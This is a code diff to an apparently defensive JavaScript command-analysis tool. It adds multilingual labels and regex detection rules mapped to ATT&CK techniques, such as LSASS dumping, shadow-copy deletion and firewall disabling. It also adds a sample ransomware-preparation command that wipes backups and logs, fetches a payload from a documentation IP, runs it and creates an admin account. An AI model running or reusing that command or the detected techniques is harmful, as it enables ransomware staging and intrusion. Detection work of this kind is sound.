@@ -20,6 +20,96 @@
   }
   /* Traductions espagnol, portugais, allemand (clé : texte français). */
   var I18N = {
+"Exécution via mshta (application HTML)": [
+"Ejecución mediante mshta (aplicación HTML)",
+"Execução via mshta (aplicação HTML)",
+"Ausführung über mshta (HTML-Anwendung)"
+],
+"Exécution d'une DLL via rundll32": [
+"Ejecución de una DLL mediante rundll32",
+"Execução de uma DLL via rundll32",
+"DLL-Ausführung über rundll32"
+],
+"Exécution via regsvr32 (technique « Squiblydoo »)": [
+"Ejecución mediante regsvr32 (técnica «Squiblydoo»)",
+"Execução via regsvr32 (técnica «Squiblydoo»)",
+"Ausführung über regsvr32 („Squiblydoo“-Technik)"
+],
+"Installation MSI distante ou silencieuse": [
+"Instalación MSI remota o silenciosa",
+"Instalação MSI remota ou silenciosa",
+"Entfernte oder stille MSI-Installation"
+],
+"Décodage d'un fichier avec certutil": [
+"Decodificación de un archivo con certutil",
+"Descodificação de um ficheiro com certutil",
+"Dateidekodierung mit certutil"
+],
+"Tâche de transfert BITS": [
+"Tarea de transferencia BITS",
+"Tarefa de transferência BITS",
+"BITS-Übertragungsauftrag"
+],
+"Suppression des sauvegardes et de la restauration (signe typique de rançongiciel)": [
+"Eliminación de copias de seguridad y de la restauración (señal típica de ransomware)",
+"Eliminação das cópias de segurança e do restauro (sinal típico de ransomware)",
+"Löschen von Sicherungen und Wiederherstellung (typisches Ransomware-Zeichen)"
+],
+"Effacement des journaux d'événements Windows": [
+"Borrado de los registros de eventos de Windows",
+"Apagamento dos registos de eventos do Windows",
+"Löschen der Windows-Ereignisprotokolle"
+],
+"Création d'un compte local": [
+"Creación de una cuenta local",
+"Criação de uma conta local",
+"Erstellung eines lokalen Kontos"
+],
+"Ajout d'un compte au groupe Administrateurs": [
+"Cuenta añadida al grupo Administradores",
+"Conta adicionada ao grupo Administradores",
+"Konto zur Administratorengruppe hinzugefügt"
+],
+"Vol d'identifiants dans la mémoire de LSASS": [
+"Robo de credenciales en la memoria de LSASS",
+"Roubo de credenciais na memória do LSASS",
+"Diebstahl von Anmeldedaten aus dem LSASS-Speicher"
+],
+"Copie de la base SAM (hachés de mots de passe locaux)": [
+"Copia de la base SAM (hashes de contraseñas locales)",
+"Cópia da base SAM (hashes das palavras-passe locais)",
+"Kopie der SAM-Datenbank (lokale Passwort-Hashes)"
+],
+"Copie de la base Active Directory (NTDS.dit)": [
+"Copia de la base de Active Directory (NTDS.dit)",
+"Cópia da base do Active Directory (NTDS.dit)",
+"Kopie der Active-Directory-Datenbank (NTDS.dit)"
+],
+"Désactivation du pare-feu Windows": [
+"Desactivación del cortafuegos de Windows",
+"Desativação da firewall do Windows",
+"Windows-Firewall deaktiviert"
+],
+"Création d'un service Windows (persistance)": [
+"Creación de un servicio de Windows (persistencia)",
+"Criação de um serviço do Windows (persistência)",
+"Windows-Dienst erstellt (Persistenz)"
+],
+"Reconnaissance de l'annuaire Active Directory": [
+"Reconocimiento del directorio Active Directory",
+"Reconhecimento do diretório Active Directory",
+"Erkundung des Active Directory"
+],
+"Compression de données (préparation d'une exfiltration)": [
+"Compresión de datos (preparación de una exfiltración)",
+"Compressão de dados (preparação de uma exfiltração)",
+"Datenarchivierung (Vorbereitung einer Exfiltration)"
+],
+"Exemple : ligne de commande": [
+"Ejemplo: línea de comandos",
+"Exemplo: linha de comandos",
+"Beispiel: Befehlszeile"
+],
 "copié ✓": [
 "copiado ✓",
 "copiado ✓",
@@ -1893,9 +1983,31 @@
     [/ActiveXObject|WScript\.Shell|Shell\.Application|WScript\.CreateObject/i, "Exécution via Windows Script Host (JScript/VBScript)", "Execution via Windows Script Host (JScript/VBScript)", "T1059.007"],
     [/Get-WmiObject|Win32_Process|Invoke-WmiMethod|\bwmic\s/i, "Utilisation de WMI", "WMI usage", "T1047"],
     [/\b(?:whoami|systeminfo|ipconfig|nltest|Get-ComputerInfo)\b|\bnet\s{1,3}(?:user|group|localgroup)\b/i, "Reconnaissance du système", "System discovery", "T1082"],
-    [/\b(?:mshta|rundll32|regsvr32)(?:\.exe)?\b/i, "Binaire système détourné (LOLBin)", "System binary proxy execution (LOLBin)", "T1218"],
+    [/\bmshta(?:\.exe)?\b/i, "Exécution via mshta (application HTML)", "Execution via mshta (HTML application)", "T1218.005"],
+    [/\brundll32(?:\.exe)?\b/i, "Exécution d'une DLL via rundll32", "DLL execution via rundll32", "T1218.011"],
+    [/\bregsvr32(?:\.exe)?\b/i, "Exécution via regsvr32 (technique « Squiblydoo »)", "Execution via regsvr32 (“Squiblydoo” technique)", "T1218.010"],
+    [/\bmsiexec(?:\.exe)?\b[^\n]{0,80}(?:https?:\/\/|\s\/q)/i, "Installation MSI distante ou silencieuse", "Remote or silent MSI install", "T1218.007"],
+    [/\bcertutil(?:\.exe)?\b[^\n]{0,40}\s[-\/]decode(?:hex)?\b/i, "Décodage d'un fichier avec certutil", "File decoding with certutil", "T1140"],
+    [/\bbitsadmin(?:\.exe)?\b[^\n]{0,20}\s\/(?:transfer|create|addfile|SetNotifyCmdLine)\b/i, "Tâche de transfert BITS", "BITS transfer job", "T1197"],
+    [/vssadmin[^\n]{0,20}delete\s{1,5}shadows|shadowcopy\s{1,5}delete|wbadmin[^\n]{0,20}delete\s{1,5}(?:catalog|systemstatebackup)|recoveryenabled\s{1,5}no|bootstatuspolicy\s{1,5}ignoreallfailures/i, "Suppression des sauvegardes et de la restauration (signe typique de rançongiciel)", "Backups and recovery deleted (typical ransomware sign)", "T1490"],
+    [/wevtutil(?:\.exe)?\s{1,5}(?:cl|clear-log)\b|Clear-EventLog|Remove-EventLog/i, "Effacement des journaux d'événements Windows", "Windows event logs cleared", "T1070.001"],
+    [/\bnet1?(?:\.exe)?\s{1,3}user\s[^\n]{0,60}\/add\b|New-LocalUser/i, "Création d'un compte local", "Local account created", "T1136.001"],
+    [/\bnet1?(?:\.exe)?\s{1,3}localgroup\s{1,3}(?:administrat|"administrat)[^\n]{0,60}\/add\b|Add-LocalGroupMember[^\n]{0,40}Administrat/i, "Ajout d'un compte au groupe Administrateurs", "Account added to the Administrators group", "T1098"],
+    [/comsvcs(?:\.dll)?[^\n]{0,30}MiniDump|procdump[^\n]{0,40}lsass|sekurlsa|lsass\.dmp/i, "Vol d'identifiants dans la mémoire de LSASS", "Credential theft from LSASS memory", "T1003.001"],
+    [/\breg(?:\.exe)?\s{1,3}save\s{1,3}hklm\\(?:sam|system|security)\b/i, "Copie de la base SAM (hachés de mots de passe locaux)", "SAM database copied (local password hashes)", "T1003.002"],
+    [/ntdsutil[^\n]{0,60}\bifm\b|\bntds\.dit\b/i, "Copie de la base Active Directory (NTDS.dit)", "Active Directory database copied (NTDS.dit)", "T1003.003"],
+    [/netsh[^\n]{0,30}advfirewall[^\n]{0,40}state\s{1,3}off|netsh[^\n]{0,20}firewall\s{1,3}set\s{1,3}opmode[^\n]{0,20}disable|Set-NetFirewallProfile[^\n]{0,60}-Enabled\s{1,3}(?:\$false|False|0)/i, "Désactivation du pare-feu Windows", "Windows firewall disabled", "T1562.004"],
+    [/\bsc(?:\.exe)?\s{1,3}(?:\\\\\S{1,60}\s{1,3})?create\s|New-Service\b/i, "Création d'un service Windows (persistance)", "Windows service created (persistence)", "T1543.003"],
+    [/nltest[^\n]{0,20}\/domain_trusts|\bdsquery\b|\bAdFind\b|Get-AD(?:User|Computer|Group)\b/i, "Reconnaissance de l'annuaire Active Directory", "Active Directory discovery", "T1087.002"],
+    [/Compress-Archive|\brar(?:\.exe)?\s{1,3}a\s[^\n]{0,40}-hp|\b7z(?:a|\.exe)?\s{1,3}a\s[^\n]{0,60}-p\S/i, "Compression de données (préparation d'une exfiltration)", "Data archived (exfiltration staging)", "T1560.001"],
     [/FromBase64String|\batob\s*\(|\[char\]|fromCharCode|-bxor|\s-e(?:nc|ncodedcommand|c)?\s+[A-Za-z0-9+\/]{20,}/i, "Obfuscation (encodage, codes de caractères…)", "Obfuscation (encoding, character codes…)", "T1027"]
   ];
+
+  /* Exemple fictif de ligne de commande (préparation d'un rançongiciel) ; IP réservée à la documentation (RFC 5737). */
+  var SAMPLE_CMD = 'cmd.exe /c "vssadmin delete shadows /all /quiet & wevtutil cl Security & bcdedit /set {default} recoveryenabled no' +
+    ' & netsh advfirewall set allprofiles state off & certutil -urlcache -split -f http://198.51.100.23/a.txt C:\\Users\\Public\\a.txt' +
+    ' & certutil -decode C:\\Users\\Public\\a.txt C:\\Users\\Public\\a.dll & rundll32 C:\\Users\\Public\\a.dll,Start' +
+    ' & net user svc_backup P@ss-2026 /add & net localgroup administrators svc_backup /add"';
 
   function initDeob() {
     var input = $("#do-input"), status = $("#do-status"), results = $("#do-results");
@@ -2012,6 +2124,8 @@
 
     runBtn.addEventListener("click", run);
     defang.addEventListener("change", renderIocs);
+    var cmdBtn = $("#do-sample-cmd");
+    if (cmdBtn) cmdBtn.addEventListener("click", function () { input.value = SAMPLE_CMD; run(); });
     $("#do-sample").addEventListener("click", function () {
       sample().then(function (s) { input.value = s; run(); });
     });
